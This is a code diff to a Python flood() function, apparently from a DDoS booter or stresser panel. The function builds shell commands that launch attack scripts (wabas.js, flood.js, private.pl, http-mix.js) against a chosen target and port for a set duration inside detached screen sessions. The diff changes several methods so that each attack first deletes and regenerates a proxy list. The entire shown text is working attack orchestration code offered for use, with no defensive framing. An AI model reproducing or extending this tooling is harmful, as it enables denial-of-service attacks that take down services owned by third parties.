@@ -70,11 +70,11 @@ def flood():
         screen_cmd = f"screen -dm -S {screen_name} timeout {time}"
 
         if method == "BYPASS":
-            cmd = f"cd /root && {screen_cmd} node wabas.js {target} {time} 60 2 proxy.txt"
+            cmd = f"rm -f proxy.txt && python3 main.py && {screen_cmd} node wabas.js {target} {time} 60 2 proxy.txt"
         elif method == "ZEUS":
-            cmd = f"cd /root && {screen_cmd} node flood.js {target} {time} 60 3"
+            cmd = f"rm -f proxy.txt && python3 main.py && {screen_cmd} node flood.js {target} {time} 60 3"
         elif method == "UDP":
-            cmd = f"cd /root && {screen_cmd} perl private.pl {target} {port} 5000 {time}"
+            cmd = f"rm -f proxy.txt && python3 main.py && {screen_cmd} perl private.pl {target} {port} 5000 {time}"
         elif method == "HTTP-MIX":
             cmd = f"cd /root/l7/mix && {screen_cmd} node http-mix.js {target} {time} 15"
         elif method == "HTTP-QUERY":
